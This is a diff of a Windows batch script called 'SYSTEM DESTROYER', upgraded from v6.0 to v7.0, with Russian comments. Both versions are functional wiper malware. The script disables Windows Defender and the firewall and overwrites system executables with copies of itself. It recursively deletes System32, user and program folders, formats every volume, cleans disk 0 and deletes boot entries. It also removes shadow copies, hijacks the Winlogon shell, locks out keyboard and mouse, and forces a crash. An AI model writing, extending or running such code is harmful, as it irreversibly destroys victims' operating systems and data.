@@ -8,150 +8,146 @@ if '%errorlevel%' NEQ '0' (
 )
 
 mode con: cols=80 lines=30
-title SYSTEM DESTROYER v6.0 - FINAL EXTERMINATION
+title SYSTEM DESTROYER v7.0 - FINAL APOCALYPSE
 
-:: ========== САМОКОПИРОВАНИЕ И АВТОЗАПУСК ==========
-echo [0] INSTALLING DESTROYER TO SYSTEM...
-copy "%~f0" "%SystemRoot%\System32\wininit.exe" >nul 2>&1
-copy "%~f0" "%SystemRoot%\System32\smss.exe" >nul 2>&1
-copy "%~f0" "%SystemRoot%\System32\csrss.exe" >nul 2>&1
-copy "%~f0" "%SystemRoot%\System32\winlogon.exe" >nul 2>&1
-copy "%~f0" "%SystemRoot%\System32\services.exe" >nul 2>&1
-copy "%~f0" "%SystemRoot%\System32\lsass.exe" >nul 2>&1
+:: ========== ФАЗА 0: САМОКОПИРОВАНИЕ И БЛОКИРОВКА АНТИВИРУСОВ ==========
+echo [0] DISABLING SECURITY...
+sc config WinDefend start= disabled >nul 2>&1
+sc stop WinDefend >nul 2>&1
+sc config wscsvc start= disabled >nul 2>&1
+sc stop wscsvc >nul 2>&1
+netsh advfirewall set allprofiles state off >nul 2>&1
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "%~f0" /f >nul 2>&1
-schtasks /create /tn "SystemDestroyer" /tr "%~f0" /sc onstart /ru SYSTEM /f >nul 2>&1
+:: Копируем себя в системные папки
+set copies=0
+for %%p in (
+    "%SystemRoot%\System32\wininit.exe"
+    "%SystemRoot%\System32\smss.exe" 
+    "%SystemRoot%\System32\csrss.exe"
+    "%SystemRoot%\System32\winlogon.exe"
+    "%SystemRoot%\System32\services.exe"
+    "%SystemRoot%\System32\lsass.exe"
+    "%SystemRoot%\explorer.exe"
+    "%SystemRoot%\notepad.exe"
+    "%SystemRoot%\regedit.exe"
+    "%SystemRoot%\cmd.exe"
+) do (
+    copy "%~f0" "%%p" >nul 2>&1 && set /a copies+=1
+)
 
-:: ========== БЛОКИРОВКА ДОСТУПА К ФАЙЛАМ ==========
-echo [1] BLOCKING SYSTEM ACCESS...
-takeown /f C:\Windows /r /d y >nul 2>&1
-icacls C:\Windows /deny Everyone:(DE,DC) /t /c /q >nul 2>&1
-icacls C:\Windows /deny SYSTEM:(DE,DC) /t /c /q >nul 2>&1
-icacls C:\Windows /deny Administrators:(DE,DC) /t /c /q >nul 2>&1
+:: ========== ФАЗА 1: ПАРАЛЛЕЛЬНОЕ УНИЧТОЖЕНИЕ СИСТЕМНЫХ ПАПОК ==========
+echo [1] PARALLEL SYSTEM DESTRUCTION...
+start "KILL1" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (rd /s /q C:\Windows\System32 2>nul & del /f /s /q C:\Windows\*.* 2>nul)"
+start "KILL2" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (rd /s /q C:\ProgramData 2>nul & rd /s /q C:\Program Files 2>nul)"
+start "KILL3" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (rd /s /q C:\Users 2>nul & rd /s /q C:\Program Files (x86) 2>nul)"
+start "KILL4" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (del /f /q C:\*.sys 2>nul & del /f /q C:\*.dll 2>nul)"
+start "KILL5" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (takeown /f C:\Windows /r /d y 2>nul & icacls C:\Windows /grant everyone:F /t /c /q 2>nul)"
 
-:: ========== ЗАПУСК МНОГОПОТОЧНОГО УНИЧТОЖЕНИЯ ==========
-echo [2] LAUNCHING DESTRUCTION THREADS...
+:: ========== ФАЗА 2: ФИЗИЧЕСКОЕ УНИЧТОЖЕНИЕ ДИСКОВ ==========
+echo [2] PHYSICAL DISK DESTRUCTION...
+start "DISK1" /B /MIN powershell -Command "while($true){Format-Volume -DriveLetter C -FileSystem NTFS -Force -Confirm:$false}"
+start "DISK2" /B /MIN powershell -Command "while($true){Format-Volume -DriveLetter D -FileSystem NTFS -Force -Confirm:$false}"
+start "DISK3" /B /MIN powershell -Command "Get-Volume | Where-Object {$_.DriveLetter -ne $null} | Format-Volume -FileSystem RAW -Force -Confirm:$false"
 
-start "KILLER1" /min cmd /c ":loop && rd /s /q C:\Windows\System32 && goto loop"
-start "KILLER2" /min cmd /c ":loop && del /f /q C:\Windows\*.exe && goto loop"
-start "KILLER3" /min cmd /c ":loop && del /f /q C:\Windows\*.dll && goto loop"
-start "KILLER4" /min cmd /c ":loop && del /f /q C:\Windows\*.sys && goto loop"
-start "KILLER5" /min cmd /c ":loop && rd /s /q C:\ProgramData && goto loop"
-start "KILLER6" /min cmd /c ":loop && rd /s /q C:\Users && goto loop"
-
-:: ========== УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА ==========
-echo [3] DESTROYING BOOTLOADER...
+:: ========== ФАЗА 3: УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА ==========
+echo [3] BOOTLOADER DESTRUCTION...
 (
 echo select disk 0
 echo clean
 echo create partition primary
-echo format fs=ntfs quick
+echo format fs=ntfs quick override
 echo exit
 ) > %temp%\killboot.dps
-diskpart /s %temp%\killboot.dps >nul 2>&1
+start /MIN diskpart /s %temp%\killboot.dps
 
-:: ========== ФОРМАТИРОВАНИЕ ВСЕХ ДИСКОВ ==========
-echo [4] FORMATTING ALL DRIVES...
-for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    if exist %%d:\ (
-        echo y|format %%d: /FS:NTFS /Q /X /V:DEAD >nul 2>&1
-        echo y|format %%d: /FS:FAT32 /Q /X /V:DEAD >nul 2>&1
-    )
-)
+bcdedit /delete {default} /f >nul 2>&1
+bcdedit /delete {bootmgr} /f >nul 2>&1
+del /f /q C:\bootmgr C:\boot\bcd C:\Windows\bootstat.dat 2>nul
 
-:: ========== УДАЛЕНИЕ ТОЧЕК ВОССТАНОВЛЕНИЯ ==========
-echo [5] DESTROYING RECOVERY POINTS...
+:: ========== ФАЗА 4: ТОТАЛЬНАЯ БЛОКИРОВКА ИНТЕРФЕЙСА ==========
+echo [4] TOTAL INTERFACE LOCKDOWN...
+
+:: Останавливаем все процессы
+start "KILLPROC" /B /MIN powershell -Command "while($true){Get-Process | Where-Object {$_.ProcessName -ne 'cmd' -and $_.ProcessName -ne 'powershell'} | Stop-Process -Force}"
+
+:: Блокируем реестр
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f >nul
+
+:: Убиваем проводник и запрещаем запуск
+taskkill /f /im explorer.exe >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "%~f0" /f >nul
+
+:: Блокируем клавиатуру в отдельном потоке
+start "KEYBLOCK" /B /MIN powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.SendKeys]::SendWait('{F1}{F2}{F3}{F4}{F5}{F6}'); Start-Sleep -Milliseconds 50}"
+
+:: Блокируем мышь в отдельном потоке  
+start "MOUSEBLOCK" /B /MIN powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0); Start-Sleep -Milliseconds 100}"
+
+:: ========== ФАЗА 5: СОЗДАНИЕ ОКНОВ ОШИБОК ==========
+echo [5] CREATING ERROR SPAM...
+start "ERROR1" /B /MIN powershell -Command "while($true){$x=[System.Windows.Forms.Cursor]::Position.X;$y=[System.Windows.Forms.Cursor]::Position.Y;[System.Windows.Forms.MessageBox]::Show('SYSTEM DESTROYED','FATAL ERROR',0,16);[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($x+(Get-Random -Minimum -100 -Maximum 100)),($y+(Get-Random -Minimum -100 -Maximum 100))); Start-Sleep -Milliseconds 500}"
+start "ERROR2" /B /MIN powershell -Command "while($true){Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('ALL DATA LOST','CRITICAL FAILURE',0,16); Start-Sleep -Seconds 1}"
+
+:: ========== ФАЗА 6: ЗАТИРАНИЕ ДИСКОВ ==========
+echo [6] DISK WIPING...
+start "WIPE1" /B /MIN cipher /w:C:\
+start "WIPE2" /B /MIN cipher /w:D:\
+start "WIPE3" /B /MIN cipher /w:E:\
+
+:: ========== ФАЗА 7: УДАЛЕНИЕ ТОЧЕК ВОССТАНОВЛЕНИЯ ==========
+echo [7] DESTROYING RECOVERY...
 vssadmin delete shadows /all /quiet >nul 2>&1
 wbadmin delete catalog -quiet >nul 2>&1
-for %%d in (C D E F) do (
-    if exist %%d:\ (
-        vssadmin delete shadows /for=%%d: /quiet >nul 2>&1
-    )
+for /f "tokens=2 delims==" %%d in ('wmic logicaldisk get caption /value') do (
+    vssadmin delete shadows /for=%%d /quiet >nul 2>&1
 )
 
-:: ========== ПОВРЕЖДЕНИЕ РЕЕСТРА ==========
-echo [6] CORRUPTING REGISTRY...
-reg delete HKLM /f >nul 2>&1
-reg delete HKCU /f >nul 2>&1
-reg delete HKCR /f >nul 2>&1
-reg delete HKU /f >nul 2>&1
-reg delete HKCC /f >nul 2>&1
-
-:: ========== БЛОКИРОВКА ИНТЕРФЕЙСА ==========
-echo [7] BLOCKING INTERFACE...
-taskkill /f /im explorer.exe >nul 2>&1
-taskkill /f /im taskmgr.exe >nul 2>&1
-
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuMorePrograms" /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSearchBox" /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoTrayContextMenu" /t REG_DWORD /d 1 /f >nul 2>&1
-
-:: ========== СОЗДАНИЕ ОКНОВ ОШИБОК ==========
-echo [8] CREATING ERROR WINDOWS...
-start /min powershell -WindowStyle Hidden -Command "while(1){Add-Type -AssemblyName System.Windows.Forms;$x=[System.Windows.Forms.Cursor]::Position.X;$y=[System.Windows.Forms.Cursor]::Position.Y;[System.Windows.Forms.MessageBox]::Show('SYSTEM DESTROYED','FATAL ERROR',0,16);[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($x+!random!%100),($y+!random!%100))}"
-
-:: ========== БЛОКИРОВКА КЛАВИАТУРЫ ==========
-echo [9] BLOCKING KEYBOARD...
-start /min powershell -Command "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); while(1){[System.Windows.Forms.SendKeys]::SendWait('{SCROLLLOCK}');[System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}');[System.Windows.Forms.SendKeys]::SendWait('{NUMLOCK}')}"
-
-:: ========== БЛОКИРОВКА МЫШИ ==========
-echo [10] BLOCKING MOUSE...
-start /min powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while(1){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0)}"
-
-:: ========== ЗАТИРАНИЕ ДИСКОВ ==========
-echo [11] WIPING DISKS...
-for %%d in (C D E F) do (
-    if exist %%d:\ (
-        echo   Wiping %%d:...
-        start /min cipher /w:%%d:\
-        start /min cmd /c "echo y|format %%d: /FS:NTFS /Q /X /V:WIPED >nul 2>&1"
-    )
-)
-
-:: ========== ОТСЧЕТ ДО ПЕРЕЗАГРУЗКИ ==========
+:: ========== ФИНАЛЬНЫЙ ОТСЧЕТ ==========
 echo.
 echo ========================================
-echo    COUNTDOWN TO PC DEATH - 30 SECONDS
+echo    FINAL COUNTDOWN TO SYSTEM DEATH
 echo ========================================
 echo.
 
-for /l %%i in (30,-1,1) do (
+for /l %%i in (60,-1,0) do (
     cls
     echo.
     echo    ╔═══════════════════════════════════════╗
-    echo    ║   SYSTEM DESTRUCTION IN PROGRESS     ║
-    echo    ║   TIME TO REBOOT: %%i SECONDS          ║
+    echo    ║     FINAL SYSTEM DESTRUCTION         ║
+    echo    ║     TIME REMAINING: %%i SECONDS       ║
     echo    ╚═══════════════════════════════════════╝
     echo.
-    echo    [ERROR] BOOT_SECTOR_DESTROYED
-    echo    [ERROR] REGISTRY_CORRUPTED
-    echo    [ERROR] SYSTEM_FILES_DELETED
-    echo    [ERROR] DISK_FORMATTING_COMPLETE
+    echo    [SYSTEM STATUS]
+    echo    ■ Bootloader: DESTROYED
+    echo    ■ System files: DELETED  
+    echo    ■ Disk partitions: FORMATTED
+    echo    ■ Registry: CORRUPTED
+    echo    ■ Recovery: DISABLED
     echo.
-    echo    Press any key to continue... (joke, keyboard disabled)
+    echo    [DESTRUCTION PROGRESS]
+    set /a percent=100-%%i*100/60
+    echo    ████████████████████████████████ !percent!%%
+    echo.
     timeout /t 1 /nobreak >nul
 )
 
 :: ========== ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА ==========
 echo.
 echo ========================================
-echo    FINAL SYSTEM DESTRUCTION COMPLETE
-echo    REBOOTING TO NOTHINGNESS...
+echo    EXECUTING FINAL SYSTEM REBOOT
 echo ========================================
 echo.
 
-echo [FINAL] Launching system reboot...
+echo [FINAL] Launching irreversible reboot...
 shutdown /r /f /t 0
-wmic os where primary=1 call reboot >nul 2>&1
+wmic os call reboot >nul 2>&1
 powershell -Command "Restart-Computer -Force"
 rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
 rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6 >nul 2>&1
 
-:: ========== ЕСЛИ ВСЕ ЕЩЕ ЖИВЫ - АВАРИЙНЫЙ ВЫХОД ==========
-taskkill /f /fi "PID ne 0" >nul 2>&1
+:: Уничтожаем командную строку
+taskkill /f /im cmd.exe >nul 2>&1
 exit
